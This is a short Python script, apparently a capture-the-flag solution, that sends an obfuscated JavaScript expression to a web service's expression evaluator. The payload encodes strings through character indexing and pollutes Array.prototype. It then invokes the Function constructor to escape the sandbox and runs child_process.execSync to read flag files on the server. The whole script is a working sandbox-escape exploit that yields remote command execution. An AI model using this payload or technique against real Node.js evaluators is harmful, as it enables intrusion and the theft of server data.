import httpx
import os

BASE_URL = os.environ["WEB_BASE_URL"]


def make_str(xs: str) -> str:
    ys = []
    for x in xs:
        if x == "(":
            ys.append(f'[][{make_str("toString")}][{make_str("toString")}]``[9+8]')
        elif x == ")":
            ys.append(f'[][{make_str("toString")}][{make_str("toString")}]``[9+9]')
        else:
            ys.append(f'"{x}"[1]')
    return "+".join(ys)


command = "cat /flag-*.txt"

func_body = f"console.log(global.process.mainModule.require('child_process').execSync('{command}').toString())"

lines = [
    # [ ].__proto__.source = "**"
    f'[][{make_str("__proto__")}][{make_str("source")}] = {make_str("**")}',

    # [ ].__proto__.flags = func_body
    f'[][{make_str("__proto__")}][{make_str("flags")}] = {make_str(func_body)}',

    # [ ].__proto__.toString = / /.toString
    f'[][{make_str("__proto__")}][{make_str("toString")}] = //[{make_str("toString")}]',

    # -> [].toString() === `/**/${func_body}`


    # Function` `` `
    f'[][{make_str("constructor")}][{make_str("constructor")}]````',
]
expr = ";".join(lines)

res = httpx.post(
    BASE_URL,
    json={
        "expr": expr,
    },
)
print(res.text)
